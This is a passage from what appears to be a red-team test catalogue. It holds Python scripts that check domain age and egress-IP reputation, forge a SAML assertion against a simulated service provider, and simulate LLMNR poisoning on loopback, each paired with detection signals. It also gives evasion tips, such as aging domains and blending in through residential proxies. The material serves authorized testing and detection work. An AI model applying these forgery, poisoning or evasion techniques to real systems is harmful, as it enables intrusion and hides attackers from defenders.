    print(f'VULNERABLE: domain is {age}d old (< {THRESH_DAYS}d). Newly-registered domains are flagged/blocked by reputation engines -> weak operational disguise; defenders can detect freshly-stood-up infra. (For a red-team op, age domains; for defense, alert on young domains contacting users.)')
    sys.exit(2)
print(f'PASS: domain age {age}d exceeds {THRESH_DAYS}d threshold (less likely auto-flagged as new).')
CO-domain-aging-reputation.success_criterion: Owned domain creation date within the threshold (default 30 days) -> 'VULNERABLE' (i.e. the domain is detectably young, the signal a defender keys on). Confirms the domain-aging reputation seam.
CO-domain-aging-reputation.safety: Read-only: passive WHOIS (port 43) lookup on an owned/public domain only; no registration, no DNS changes.

CO-residential-proxy-egress-reputation.name: Egress IP reputation / proxy-categorization passive check
CO-residential-proxy-egress-reputation.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-residential-proxy-egress-reputation.setup: python3 (stdlib). Reads an IP/CIDR list you OWN or your own egress IP, classifies ASN/category from a bundled DEFANGED reference set (offline). READ-ONLY; no external probing of third parties.
CO-residential-proxy-egress-reputation.script:
#!/usr/bin/env python3
# CO-residential-proxy-egress-reputation: classify OWNED egress IPs by the reputation/category
# a defender's IP-intel feed would assign (datacenter vs residential vs known-proxy/VPN).
# This is the DEFENDER signal an operator tries to launder via residential proxies. READ-ONLY offline.
import sys, ipaddress

# DEFANGED offline reputation reference (defanged ASNs/ranges, RFC5737/RFC1918 examples)
REF = [
    ('192.0.2.0/24',   'datacenter',          'ASN-FAKE-CLOUD',  'high'),   # cloud DC -> obvious automation
    ('198.51.100.0/24','known-proxy/vpn',     'ASN-FAKE-VPN',    'high'),   # flagged proxy/VPN exit
    ('203.0.113.0/24', 'residential',         'ASN-FAKE-ISP',    'low'),    # residential -> blends in
]

def classify(ip):
    addr = ipaddress.ip_address(ip)
    for cidr, cat, asn, risk in REF:
        if addr in ipaddress.ip_network(cidr):
            return cat, asn, risk
    return 'unknown', 'ASN-?', 'medium'

ips = sys.argv[1:] or ['192.0.2.10', '198.51.100.5', '203.0.113.7']
print('=== egress IP reputation / proxy-categorization check ===')
vuln = False
for ip in ips:
    try:
        cat, asn, risk = classify(ip)
    except ValueError:
        print(f'  {ip}: invalid IP, skipped'); continue
    print(f'  {ip}: category={cat} asn={asn} reputation_risk={risk}')
    if cat in ('datacenter', 'known-proxy/vpn') or risk == 'high':
        vuln = True
        print('    VULNERABLE: egress IP is categorized as datacenter/known-proxy/VPN with HIGH reputation risk -> defender IP-intel will flag/block it (poor egress disguise). Residential/clean ranges blend in; conversely a defender should alert on datacenter/proxy-sourced auth.')
print('PASS' if not vuln else 'VULNERABLE (see IPs above)')
sys.exit(2 if vuln else 0)
CO-residential-proxy-egress-reputation.success_criterion: An owned egress IP categorized as datacenter or known-proxy/VPN with high reputation risk -> 'VULNERABLE' (the egress is detectable). Confirms the residential-proxy egress-reputation seam.
CO-residential-proxy-egress-reputation.safety: Read-only: classifies owned IPs against a local reference set only; no scanning or probing of third-party hosts.

C-saml-forge.name: SAML assertion forge — local SP trusting issuer-only accepts self-signed assertion
C-saml-forge.setup: local AD/host lab: a single-file verifier simulating a misconfigured SAML SP that checks only the Issuer string and a signature against a key the operator controls (golden-SAML analog). FAKE lab key only; no real IdP/ADFS.
C-saml-forge.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Golden-SAML trust-failure analog: SP validates Issuer + signature but the
# signing key is one the operator can forge in-lab (simulating a stolen ADFS token-signing key).
# No real IdP, no network, FAKE key. Demonstrates issuer-only trust seam.
import hmac, hashlib, xml.etree.ElementTree as ET

LAB_SIGNING_KEY = b'LAB-FAKE-TOKEN-SIGNING-KEY'  # stand-in for compromised ADFS key

def build_assertion(user, issuer='https://lab-adfs/idp'):
    body = '<Assertion><Issuer>%s</Issuer><Subject>%s</Subject></Assertion>' % (issuer, user)
    sig = hmac.new(LAB_SIGNING_KEY, body.encode(), hashlib.sha256).hexdigest()
    return '<Signed><sig>%s</sig>%s</Signed>' % (sig, body)

def sp_verify(signed_xml):
    root = ET.fromstring(signed_xml)
    sig = root.find('sig').text
    inner = signed_xml[signed_xml.index('<Assertion>'):signed_xml.index('</Signed>')]
    exp = hmac.new(LAB_SIGNING_KEY, inner.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(exp, sig):
        return 'SIG-FAIL'
    iss = ET.fromstring(inner).find('Issuer').text
    # SEAM: SP trusts any assertion bearing the expected Issuer + valid signature. No assertion
    # conditions/NotOnOrAfter, no InResponseTo binding -> forged identity accepted.
    if iss == 'https://lab-adfs/idp':
        sub = ET.fromstring(inner).find('Subject').text
        return 'SP-ACCESS-GRANTED user=%s' % sub
    return 'ISS-FAIL'

if __name__ == '__main__':
    forged = build_assertion('Administrator')  # operator forges arbitrary user with lab key
    print('[*] forged assertion for: Administrator')
    print('sp result:', sp_verify(forged))
C-saml-forge.success_criterion: SP returns 'SP-ACCESS-GRANTED user=Administrator' for an assertion the operator minted (never issued by a real IdP) — confirms issuer+signature-only trust with no condition/replay binding. Detection analog: ADFS/Entra sign-in logs showing assertions with no matching real authentication event, or token-signing-key use outside the ADFS service account (Event 4662 on the AD CS/ADFS key, and 1202/1206 ADFS audit anomalies).
C-saml-forge.cleanup: No files/network; process exits immediately. Nothing to revert.
C-saml-forge.safety: Pure local computation, FAKE signing key, no IdP/network/third-party assertions (reference/detection, no-malware design).

C-mitm.name: LLMNR/NBT-NS poisoning sim — local responder in an owned lab segment
C-mitm.setup: local AD/host lab: a loopback simulation of LLMNR name-resolution poisoning. A 'victim' resolver multicasts a name; a rogue responder answers first. Pure localhost sockets, no real LAN multicast, no NTLM relay. (Real-lab analog: Responder.py on an OWNED, isolated lab VLAN.)
C-mitm.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY. Simulates LLMNR/NBT-NS poisoning on loopback to show the trust failure:
# a client trusts the FIRST answer to an unauthenticated name query. No real multicast, no relay,
# no credential capture. Real-lab reference: 'responder -I <lab-iface>' on an OWNED segment.
import socket, threading, time

MCAST = ('127.0.0.1', 55353)  # stand-in for 224.0.0.252:5355 LLMNR

def rogue_responder():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(MCAST)
    while True:
        data, addr = s.recvfrom(1024)
        if data.startswith(b'WHO-HAS '):
            # Attacker answers any query, claiming to be the host (poison)
            s.sendto(b'I-AM 10.0.0.66(ATTACKER)', addr)

def victim_lookup(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('127.0.0.1', 0))
    s.settimeout(2)
    s.sendto(b'WHO-HAS '+name.encode(), MCAST)
    ans,_ = s.recvfrom(1024)
    return ans.decode()

if __name__ == '__main__':
    threading.Thread(target=rogue_responder, daemon=True).start(); time.sleep(1)
    # Victim mistypes/queries a non-existent host -> no authority, accepts first responder
    res = victim_lookup('fileserver01')
    print('[*] victim resolved fileserver01 ->', res)
    if 'ATTACKER' in res:
        print('RESULT: POISONED — unauthenticated name resolution trusts rogue first-answer (seam confirmed)')
C-mitm.success_criterion: Victim resolves 'fileserver01' to the attacker-controlled value and prints 'POISONED' — confirms unauthenticated, authority-free name resolution. Detection in real lab: spike of LLMNR(5355)/NBT-NS(137) responses from a non-DNS host; Sysmon/NDR seeing one host answering many name queries; Windows Event 4648/inbound NTLM to the rogue host.
C-mitm.cleanup: Ctrl-C; loopback sockets close on exit, no persistent state.
C-mitm.safety: Loopback-only simulation, no LAN multicast, no NTLM relay, no credential capture (reference/detection, no-malware design).
